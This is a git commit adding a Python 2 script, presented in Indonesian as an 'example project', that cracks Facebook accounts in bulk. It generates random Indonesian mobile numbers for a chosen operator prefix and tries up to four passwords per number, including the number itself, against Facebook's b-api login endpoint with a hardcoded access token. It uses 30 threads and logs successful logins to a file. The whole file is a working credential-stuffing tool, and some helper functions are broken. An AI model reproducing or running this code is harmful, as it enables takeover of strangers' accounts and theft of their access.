c375ed9cae7fbece6e1cc96662c93d678fabb512
Ahmedalzwage <72076217+Ahmedalzwage@users.noreply.github.com>
2021-09-11 11:28:37 +0200

    Add files via upload

---
+++ arawangy.py
@@ -0,0 +1,296 @@
+#coding=utf-8
+
+#Open Source Code Syarat? Subrek Channel Gua & Jangan Ganti Bot Follow! Cukup Tambahkan Bot Follow Sajah!
+
+# Ingat Ini Hanya Untuk Contoh Project!. Kalo Mau Recode, Recode Ajah Itung² Buat Latihan Lu
+
+# Kalo Mau Izin, Izin lewat instgrm/email/fb Ajah
+
+# insgrm : https://www.instagram.com/ngemry7
+# email  : xgansb@gmail.com
+# fb     : https://www.facebook.com/meyrina.setyaningrum
+
+
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass,orbxd
+os.system('rm -rf .txt')
+for n in range(10000):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36')]
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/64.64.121.87;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/redmi;FBBD/redmi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!' + w[random.randint(0, len(w) - 1)] + i
+
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
+
+    x += '\x1b[0m'
+    x = x.replace('!0', '\x1b[0m')
+    sys.stdout.write(x + '\n')
+
+def jalan(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(0.1)
+
+def cp(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.2)
+
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.02)
+
+
+def load(word):
+    lix = [
+     '/', '-', '\xe2\x95\xb2', '|']
+    for i in range(5):
+        for x in range(len(lix)):
+            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
+            time.sleep(0.1)
+            sys.stdout.flush()
+
+logo = """\033[1;37m
+   ______\033[1;91m   __ __ \033[1;37m            __  
+  / ____/ \033[1;91m / // /  \033[1;37m  _____   / /__
+ / /      \033[1;91m/ // /_ \033[1;37m  / ___/  / //_/
+/ /___   \033[1;91m/__  __/\033[1;37m  / /__   / ,< Au \033[1;36m• \033[1;32morbXD.\033[1;37m
+\____/   \033[1;91m  /_/   \033[1;37m  \___/  /_/|_|\n"""
+
+back = 0
+oks = []
+id = []
+cpb = []
+vulnot = '\x1b[31mNot Vuln'
+vuln = '\x1b[32mVuln'
+
+def tetearakecil():
+    global cpb
+    global oks
+    os.system('clear')
+    print logo
+    print("\033[0;96m"+50*"-")
+    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Pilih Operatornya Ngab'
+    print("\033[0;96m"+50*"-")
+    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m1\x1b[1;37m] OPERATOR Telkomsel'
+    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m2\x1b[1;37m] OPERATOR Indosat'
+    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m3\x1b[1;37m] OPERATOR XL'
+    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m4\x1b[1;37m] OPERATOR Tri - 3'
+    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m5\x1b[1;37m] OPERATOR Axis'
+    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m0\x1b[1;37m] Kembali Ke Menu Awal'
+    bii = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose: ')
+    if bii == '1' or bii == '01':
+        os.system('clear')
+        print logo
+        print("\033[0;96m"+50*"-")
+        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code Telkomsel: 11 12 13 21 22 23 51 52'
+        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example Number: 62811'
+        print("\033[0;96m"+50*"-")
+        try:
+            k = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code Number: ')
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose the correct one'
+            raw_input(' [Back]')
+            tetearakecil()
+
+    elif bii == '2' or bii == '02':
+        os.system('clear')
+        print logo
+        print("\033[0;96m"+50*"-")
+        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code Indosat: 14 15 16 55 56 57 58'
+        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example Number: 62814'
+        print("\033[0;96m"+50*"-")
+        try:
+            k = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code Number: ')
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose the correct one'
+            raw_input(' [Back]')
+            tetearakecil()
+
+    elif bii == '3' or bii == '03':
+        os.system('clear')
+        print logo
+        print("\033[0;96m"+50*"-")
+        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code XL: 17 18 19 59 77 78'
+        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example Number: 62817'
+        print("\033[0;96m"+50*"-")
+        try:
+            k = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code Number: ')
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose the correct one'
+            raw_input(' [Back]')
+            tetearakecil()
+
+    elif bii == '4' or bii == '04':
+        os.system('clear')
+        print logo
+        print("\033[0;96m"+50*"-")
+        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code Three: 95 96 97 98 99'
+        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example Number: 62895'
+        print("\033[0;96m"+50*"-")
+        try:
+            k = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code Number: ')
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose the correct one '
+            raw_input(' [Back]')
+            tetearakecil()
+
+    elif bii == '5' or bii == '05':
+        os.system('clear')
+        print logo
+        print("\033[0;96m"+50*"-")
+        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code Axis: 38 31 32 33'
+        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example Number: 62838'
+        print("\033[0;96m"+50*"-")
+        try:
+            k = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code Number: ')
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose the correct one '
+            raw_input(' [Back]')
+            tetearakecil()
+
+    elif bii == '0' or bii == '00':
+        exit(orbxd.menu())
+    else:
+        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose the correct one '
+        tetearakecil()
+    biixdpw1 = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password 1  : ')
+    biixdpw2 = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password 2  : ')
+    biixdpw3 = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password 3  : ')
+    print("\033[0;96m"+50*"-")
+    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Your Network Dependent Process!!!'
+    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Type CTRL + Z To Stop Crack\x1b[1;37m'
+    print("\033[0;96m"+50*"-")
+    xxx = str(len(id))
+    psb('\x1b[0;97m [\x1b[1;36m•\x1b[1;37m] Total Crack : ' + xxx)
+    psb('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] START CRACK...')
+    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account Live/Check saved to : done/indo.txt'
+    print("\033[0;96m"+50*"-")
+
+    def main(arg):
+        user = arg
+
+        try:
+            pass1 = biixdpw1
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + '[LIVE]' + k + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;97m [\x1b[1;92mLIVE\x1b[1;97m] ' + k + user + '|' + pass1
+                okb = open('done/indo.txt', 'a')
+                okb.write(' [LIVE] ' + k + user + '|' + pass1 + '\n')
+                okb.close()
+                oks.append(k + user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;97m [\x1b[1;93mCHEK\x1b[1;97m] ' + k + user + '|' + pass1
+                cps = open('done/indo.txt', 'a')
+                cps.write(' [CHEK] ' + k + user + '|' + pass1 + '\n')
+                cps.close()
+                cpb.append(k + user + pass1)
+            else:
+                pass2 = biixdpw2
+                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + '[LIVE]' + k + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                q = json.load(data)
+                if 'access_token' in q:
+                    print '\x1b[1;97m [\x1b[1;92mLIVE\x1b[1;97m] ' + k + user + '|' + pass2
+                    okb = open('done/indo.txt', 'a')
+                    okb.write(' [LIVE] ' + k + user + '|' + pass2 + '\n')
+                    okb.close()
+                    oks.append(k + user + pass2)
+                elif 'www.facebook.com' in q['error_msg']:
+                    print '\x1b[1;97m [\x1b[1;93mCHEK\x1b[1;97m] ' + k + user + '|' + pass2
+                    cps = open('done/indo.txt', 'a')
+                    cps.write(' [CHEK] ' + k + user + '|' + pass2 + '\n')
+                    cps.close()
+                    cpb.append(k + user + pass2)
+                else:
+                    pass3 = biixdpw3
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + '[LIVE]' + k + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;97m [\x1b[1;92mLIVE\x1b[1;97m] ' + k + user + '|' + pass3
+                        okb = open('done/indo.txt', 'a')
+                        okb.write(' [LIVE] ' + k + user + '|' + pass3 + '\n')
+                        okb.close()
+                        oks.append(k + user + pass3)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;97m [\x1b[1;93mCHEK\x1b[1;97m] ' + k + user + '|' + pass3
+                        cps = open('done/indo.txt', 'a')
+                        cps.write(' [CHEK] ' + k + user + '|' + pass3 + '\n')
+                        cps.close()
+                        cpb.append(k + user + pass3)
+                    else:
+                        pass4 = user
+                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + '[LIVE]' + k + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                        q = json.load(data)
+                        if 'access_token' in q:
+                            print '\x1b[1;97m [\x1b[1;92mLIVE\x1b[1;97m] ' + k + user + '|' + pass4
+                            okb = open('done/indo.txt', 'a')
+                            okb.write(' [LIVE] ' + k + user + '|' + pass4 + '\n')
+                            okb.close()
+                            oks.append(k + user + pass4)
+                        elif 'www.facebook.com' in q['error_msg']:
+                            print '\x1b[1;97m [\x1b[1;93mCHEK\x1b[1;97m] ' + k + user + '|' + pass4
+                            cps = open('done/indo.txt', 'a')
+                            cps.write(' [CHEK] ' + k + user + '|' + pass4 + '\n')
+                            cps.close()
+                            cpb.append(k + user + pass4)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] CRACKER Completed ...'
+    raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Press Enter Go Back To Menu \x1b[1;97m')
+    tetearakecil()
+
+if __name__=="__main__":
+    tetearakecil()
